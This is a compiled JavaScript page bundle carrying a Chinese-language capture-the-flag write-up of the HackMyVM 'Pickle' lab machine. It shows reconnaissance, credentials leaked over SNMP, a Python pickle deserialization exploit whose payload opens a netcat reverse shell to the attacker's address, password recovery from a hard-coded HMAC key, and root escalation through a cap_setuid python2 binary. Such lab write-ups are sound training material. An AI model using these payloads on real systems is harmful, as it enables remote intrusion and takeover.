"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8560],{42601:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var r=s(85893),t=s(11151);const a={},o="Pickle",c={id:"HackMyVM/Machines/Pickle/index",title:"Pickle",description:"[Linux VM] [Tested on VirtualBox] created by || 0xEEX75",source:"@site/docs/HackMyVM/Machines/Pickle/index.md",sourceDirName:"HackMyVM/Machines/Pickle",slug:"/HackMyVM/Machines/Pickle/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pickle/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Pickle/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Orasi",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Orasi/"},next:{title:"Pipy",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pipy/"}},i={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp \u533f\u540d\u767b\u9646",id:"ftp-\u533f\u540d\u767b\u9646",level:2},{value:"snmp \u670d\u52a1\u63a2\u6d4b",id:"snmp-\u670d\u52a1\u63a2\u6d4b",level:2},{value:"Python \u670d\u52a1\u6e90\u7801\u5206\u6790",id:"python-\u670d\u52a1\u6e90\u7801\u5206\u6790",level:2},{value:"\u6839\u8def\u7531",id:"\u6839\u8def\u7531",level:3},{value:"<code>/checklist</code> \u8def\u7531",id:"checklist-\u8def\u7531",level:3},{value:"\u5c1d\u8bd5\u5229\u7528",id:"\u5c1d\u8bd5\u5229\u7528",level:3},{value:"User - lucas",id:"user---lucas",level:2},{value:"\u67e5\u770b\u670d\u52a1\u6e90\u7801",id:"\u67e5\u770b\u670d\u52a1\u6e90\u7801",level:3},{value:"User - mark",id:"user---mark",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function p(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,t.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"pickle",children:"Pickle"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || 0xEEX75"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-22"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // b686ceacc5e04131dcb895e19f2de9d4"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 31"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 29"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nContact me if you need any help. @OldProgrammer#1257."})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.118\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="nmap tcp"',children:"Nmap scan report for 192.168.56.118\nHost is up (0.00052s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak\n1337/tcp open  http    Werkzeug httpd 1.0.1 (Python 2.7.16)\n| http-auth:\n| HTTP/1.0 401 UNAUTHORIZED\\x0D\n|_  Basic realm=Pickle login\n|_http-server-header: Werkzeug/1.0.1 Python/2.7.16\n|_http-title: Site doesn't have a title (text/html; charset=utf-8).\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="nmap udp"',children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 192.168.56.118\nStarting Nmap 7.94SVN (https://nmap.org) at 2024-02-23 09:12 CST\nNmap scan report for 192.168.56.118\nHost is up (0.00069s latency).\n\nPORT      STATE         SERVICE      VERSION\n161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)\n| snmp-info:\n|   enterprise: net-snmp\n|   engineIDFormat: unknown\n|   engineIDData: 8ac2e5721551835f00000000\n|   snmpEngineBoots: 26\n|_  snmpEngineTime: 2m55s\n| snmp-sysdescr: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64\n|_  System uptime: 2m55.16s (17516 timeticks)\n"})}),"\n",(0,r.jsx)(n.h2,{id:"ftp-\u533f\u540d\u767b\u9646",children:"ftp \u533f\u540d\u767b\u9646"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\n229 Entering Extended Passive Mode (|||33958|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 Oct 12  2020 .\ndrwxr-xr-x    2 0        0            4096 Oct 12  2020 ..\n-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from functools import wraps\nfrom flask import *\nimport hashlib\nimport socket\nimport base64\nimport pickle\nimport hmac\n\napp = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")\n\n@app.route(\'/\', methods=["GET", "POST"])\ndef index_page():\n        \'\'\'\n                __index_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["story"] and request.form["submit"]:\n                md5_encode = hashlib.md5(request.form["story"]).hexdigest()\n                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)\n                write_page = open(paths_page, "w")\n                write_page.write(request.form["story"])\n\n                return "The message was sent successfully!"\n\n        return render_template("index.html")\n\n@app.route(\'/reset\', methods=["GET", "POST"])\ndef reset_page():\n        \'\'\'\n                __reset_page__()\n        \'\'\'\n        pass\n\n\n@app.route(\'/checklist\', methods=["GET", "POST"])\ndef check_page():\n        \'\'\'\n                __check_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["check"]:\n                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])\n                open_page    = open(path_page, "rb").read()\n                if "p1" in open_page:\n                        open_page = pickle.loads(open_page)\n                        return str(open_page)\n                else:\n                        return open_page\n        else:\n                return "Server Error!"\n\n        return render_template("checklist.html")\n\nif __name__ == \'__main__\':\n        app.run(host=\'0.0.0.0\', port=1337, debug=True)\n'})}),"\n",(0,r.jsx)(n.h2,{id:"snmp-\u670d\u52a1\u63a2\u6d4b",children:"snmp \u670d\u52a1\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $ snmpwalk -c public -v 1 192.168.56.118 | head -n 15\niso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (2074634) 5:45:46.34\niso.3.6.1.2.1.1.4.0 = STRING: "lucas:SuperSecretPassword123!"\niso.3.6.1.2.1.1.5.0 = STRING: "pickle"\niso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"\niso.3.6.1.2.1.1.7.0 = INTEGER: 72\niso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06\niso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1\niso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1\niso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1\niso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1\niso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1\niso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49\niso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u5f97\u5230\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"lucas:SuperSecretPassword123!\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f7f\u7528\u8fd9\u7ec4\u51ed\u636e\u5373\u53ef\u6210\u529f\u767b\u5f55 ",(0,r.jsx)(n.code,{children:"http://192.168.56.118:1337/"})]}),"\n",(0,r.jsx)(n.h2,{id:"python-\u670d\u52a1\u6e90\u7801\u5206\u6790",children:"Python \u670d\u52a1\u6e90\u7801\u5206\u6790"}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e\u62ff\u5230\u7684\u6e90\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\uff0c\u670d\u52a1\u603b\u5171\u6709\u4e09\u4e2a\u8def\u7531"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"/\n/reset\n/checklist\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u6839\u8def\u7531",children:"\u6839\u8def\u7531"}),"\n",(0,r.jsxs)(n.p,{children:["\u5bf9 ",(0,r.jsx)(n.code,{children:"/"})," \u8def\u7531\u90e8\u5206\u8fdb\u884c\u5206\u6790"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'@app.route(\'/\', methods=["GET", "POST"])\ndef index_page():\n        \'\'\'\n                __index_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["story"] and request.form["submit"]:\n                md5_encode = hashlib.md5(request.form["story"]).hexdigest()\n                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)\n                write_page = open(paths_page, "w")\n                write_page.write(request.form["story"])\n\n                return "The message was sent successfully!"\n\n        return render_template("index.html")\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u670d\u52a1\u4f1a\u68c0\u67e5 POST \u8fc7\u53bb\u7684\u6570\u636e\u4e2d\u662f\u5426\u6709 ",(0,r.jsx)(n.code,{children:"story"})," \u548c ",(0,r.jsx)(n.code,{children:"submit"})," \u4e24\u4e2a\u53d8\u91cf"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'if request.method == "POST" and request.form["story"] and request.form["submit"]\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u7136\u540e\u5bf9\u53d1\u9001\u7684 ",(0,r.jsx)(n.code,{children:"story"})," \u53d8\u91cf\u8ba1\u7b97\u54c8\u5e0c\uff0c\u5e76\u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\uff0c\u5199\u5165 ",(0,r.jsx)(n.code,{children:"story"})," \u53d8\u91cf\u4e2d\u7684\u6570\u636e"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'md5_encode = hashlib.md5(request.form["story"]).hexdigest()\npaths_page  = "/opt/project/uploads/%s.log" %(md5_encode)\nwrite_page = open(paths_page, "w")\nwrite_page.write(request.form["story"])\n'})}),"\n",(0,r.jsxs)(n.h3,{id:"checklist-\u8def\u7531",children:[(0,r.jsx)(n.code,{children:"/checklist"})," \u8def\u7531"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'@app.route(\'/checklist\', methods=["GET", "POST"])\ndef check_page():\n        \'\'\'\n                __check_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["check"]:\n                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])\n                open_page    = open(path_page, "rb").read()\n                if "p1" in open_page:\n                        open_page = pickle.loads(open_page)\n                        return str(open_page)\n                else:\n                        return open_page\n        else:\n                return "Server Error!"\n\n        return render_template("checklist.html")\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u8def\u7531\u4f1a\u5c06 POST \u8fc7\u53bb\u7684\u6570\u636e\u4e2d\u7684 ",(0,r.jsx)(n.code,{children:"check"})," \u53d8\u91cf\u63d0\u53d6\u51fa\u6765\uff0c\u7ec4\u5408\u4e3a\u6587\u4ef6\u540d\u5e76\u8fdb\u884c\u8bfb\u53d6"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'if request.method == "POST" and request.form["check"]:\n        path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])\n        open_page    = open(path_page, "rb").read()\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u7ed3\u5408\u4e0a\u6587\u7684\u5206\u6790\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u53d1\u73b0\u662f\u8bfb\u53d6\u4e0a\u6587\u7684\u65e5\u5fd7\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u63a5\u4e0b\u6765\u8fdb\u5165\u6570\u636e\u68c0\u67e5\u90e8\u5206"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'if "p1" in open_page\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c ",(0,r.jsx)(n.code,{children:"p1"})," \u5b57\u6bb5\u5b58\u5728\u4e8e\u6570\u636e\u4e2d\uff0c\u5219\u8fdb\u5165\u53cd\u5e8f\u5217\u5316\u9636\u6bb5"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"open_page = pickle.loads(open_page)\nreturn str(open_page)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u4e14\u6839\u636e\u62a5\u9519\u4fe1\u606f\uff0c\u53ef\u4ee5\u5f97\u5230\u73af\u5883\u7684 Python \u7248\u672c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Python 2.7\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u5c1d\u8bd5\u5229\u7528",children:"\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,r.jsx)(n.admonition,{type:"warning",children:(0,r.jsx)(n.p,{children:"\u5229\u7528\u811a\u672c\u5fc5\u987b\u4f7f\u7528 Python2 \u8fdb\u884c\u7f16\u5199\u5e76\u8fd0\u884c\uff0c\u56e0\u4e3a Python3 \u4e0e Python2 \u4e4b\u95f4\u7684 Pickle \u7684\u8fd0\u884c\u65b9\u5f0f\u5b58\u5728\u5dee\u5f02"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'#coding:utf-8\nimport os\nimport cPickle\nimport hashlib\nimport requests\n\n\nclass CommandExecute(object):\n        def __reduce__(self):\n                return (os.system, (\'nc 192.168.56.102 9999 -e /bin/bash\',))\n\nconvert_data = cPickle.dumps(CommandExecute())\nconvert_crypt = hashlib.md5(convert_data).hexdigest()\nsend_requests = requests.post(\'http://192.168.56.118:1337/\', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))\ncheck_requests = requests.post(\'http://192.168.56.118:1337/checklist\', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))\nprint(check_requests.text)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd0\u884c\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,r.jsx)(n.h2,{id:"user---lucas",children:"User - lucas"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 9999\n[15:29:38] Welcome to pwncat \ud83d\udc08!\n[15:29:40] received connection from 192.168.56.118:42900\n[15:29:40] 0.0.0.0:9999: normalizing shell path\n[15:29:41] 192.168.56.118:42900: registered new host w/ db\n(local) pwncat$ back\n(remote) lucas@pickle:/home/lucas$ whoami\nlucas\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u67e5\u770b\u670d\u52a1\u6e90\u7801",children:"\u67e5\u770b\u670d\u52a1\u6e90\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",metastring:'title="/opt/project/project.py"',children:'from functools import wraps\nfrom flask import *\nimport hashlib\nimport socket\nimport base64\nimport pickle\nimport hmac\n\napp = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")\n\ndef check_auth(username, password):\n       """This function is called to check if a username /\n       password combination is valid.\n       """\n       return username == \'lucas\' and password == \'SuperSecretPassword123!\'\n\ndef authenticate():\n       """Sends a 401 response that enables basic auth"""\n       return Response(\n       \'Could not verify your access level for that URL.\\n\'\n       \'You have to login with proper credentials\', 401,\n       {\'WWW-Authenticate\': \'Basic realm="Pickle login"\'})\n\ndef requires_auth(f):\n       @wraps(f)\n       def decorated(*args, **kwargs):\n           auth = request.authorization\n           if not auth or not check_auth(auth.username, auth.password):\n               return authenticate()\n           return f(*args, **kwargs)\n       return decorated\n\n@app.route(\'/\', methods=["GET", "POST"])\n@requires_auth\ndef index_page():\n        \'\'\'\n                __index_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["story"] and request.form["submit"]:\n                md5_encode = hashlib.md5(request.form["story"]).hexdigest()\n                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)\n                write_page = open(paths_page, "w")\n                write_page.write(request.form["story"])\n\n                return "The message was sent successfully!"\n\n        return render_template("index.html")\n\n@app.route(\'/reset\', methods=["GET", "POST"])\n@requires_auth\ndef reset_page():\n        \'\'\'\n                __reset_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["username"] and request.form["key"]:\n                key    = "dpff43f3p214k31301"\n                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())\n                hashed = hmac.new(key, raw, hashlib.sha1)\n                if request.form["key"] == hashed.hexdigest():\n                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\\n"))\n        else:\n                return "Server Error!"\n        return render_template("reset.html")\n\n\n@app.route(\'/checklist\', methods=["GET", "POST"])\n@requires_auth\ndef check_page():\n        \'\'\'\n                __check_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["check"]:\n                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])\n                open_page    = open(path_page, "rb").read()\n                if "p1" in open_page:\n                        open_page = pickle.loads(open_page)\n                        return str(open_page)\n                else:\n                        return open_page\n        else:\n                return "Server Error!"\n\n        return render_template("checklist.html")\n\n@app.route(\'/console\')\n@requires_auth\ndef secret_page():\n        return "Server Error!"\n\nif __name__ == \'__main__\':\n        app.run(host=\'0.0.0.0\', port=1337, debug=True)\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u91cc\uff0c\u53ef\u4ee5\u770b\u5230\u539f\u5148\u6ca1\u6709\u5185\u5bb9\u7684 ",(0,r.jsx)(n.code,{children:"/reset"})," \u8def\u7531\u6709\u4e86\u76f8\u5173\u903b\u8f91\u5904\u7406"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'@app.route(\'/reset\', methods=["GET", "POST"])\n@requires_auth\ndef reset_page():\n        \'\'\'\n                __reset_page__()\n        \'\'\'\n        if request.method == "POST" and request.form["username"] and request.form["key"]:\n                key    = "dpff43f3p214k31301"\n                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())\n                hashed = hmac.new(key, raw, hashlib.sha1)\n                if request.form["key"] == hashed.hexdigest():\n                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\\n"))\n        else:\n                return "Server Error!"\n        return render_template("reset.html")\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u501f\u6b64\uff0c\u6211\u4eec\u80fd\u591f\u6709\u673a\u4f1a\u6062\u590d\u51fa ",(0,r.jsx)(n.code,{children:"lucas"})," \u548c ",(0,r.jsx)(n.code,{children:"mark"})," \u4e24\u4e2a\u7528\u6237\u7684\u7528\u6237\u5bc6\u7801"]}),"\n",(0,r.jsx)(n.p,{children:"\u5c06\u811a\u672c\u76f8\u5173\u90e8\u5206\u7684\u4ee3\u7801\u63d0\u53d6\u51fa\u6765\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,r.jsx)(n.admonition,{type:"warning",children:(0,r.jsxs)(n.p,{children:["\u7531\u4e8e\u6d89\u53ca\u5230 ",(0,r.jsx)(n.code,{children:"socket.gethostbyname(socket.gethostname()"})," \u6267\u884c\uff0c\u5efa\u8bae\u5728\u9776\u673a\u4e0a\u8fd0\u884c"]})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import hashlib\n# import requests\nimport socket\nimport base64\nimport hmac\n\n\nkey = "dpff43f3p214k31301"\nraw = "lucas" + key + socket.gethostbyname(socket.gethostname())\nhashed = hmac.new(key, raw, hashlib.sha1)\n\nprint(base64.b64encode(hashed.digest().encode("base64").rstrip("\\n")))\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd0\u884c\u4e4b\u540e\uff0c\u5f97\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) lucas@pickle:/tmp$ python2 attck.py\nYTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ==\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u7528\u6237\u540d\u4fee\u6539\u4e3a ",(0,r.jsx)(n.code,{children:"mark"})," \u4e4b\u540e\uff0c\u5f97\u5230"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) lucas@pickle:/tmp$ python2 attck.py\nSUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---mark",children:"User - mark"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) lucas@pickle:/tmp$ su mark\nPassword:\nmark@pickle:/tmp$ whoami\nmark\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"e25fd1b9248d1786551e3412adc74f6f\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mark@pickle:~$ ls -lh\ntotal 3.6M\n-rwxr-xr-x 1 root root 3.6M Oct 11  2020 python2\n-rw-r----- 1 mark mark   33 Oct 11  2020 user.txt\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u7684 ",(0,r.jsx)(n.code,{children:"python2"})," \u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6240\u6709\u8005\u662f ",(0,r.jsx)(n.code,{children:"root"}),"\uff0c\u4f46\u662f\u7ed9\u4e88\u4e86\u5f53\u524d\u7528\u6237\u8fd0\u884c\u6743\u9650\uff0c\u67e5\u770b\u6587\u4ef6\u7684\u66f4\u591a\u6743\u9650"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mark@pickle:~$ getcap -r ./ 2>/dev/null\n./python2 = cap_setuid+ep\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u65e2\u7136 ",(0,r.jsx)(n.code,{children:"./python2"})," \u8fd9\u4e2a\u6587\u4ef6\u62e5\u6709 ",(0,r.jsx)(n.code,{children:"cap_setuid"})," \u6743\u9650\uff0c\u90a3\u4e48\u5c31\u5f88\u597d\u529e\u4e86"]}),"\n",(0,r.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mark@pickle:~$ ./python2 -c 'import os,pty;os.setuid(0),pty.spawn(\"/bin/bash\")'\nroot@pickle:~# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"7a32c9739cc63ed983ae01af2577c01c\n"})})]})}function d(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(p,{...e})}):p(e)}},11151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>o});var r=s(67294);const t={},a=r.createContext(t);function o(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);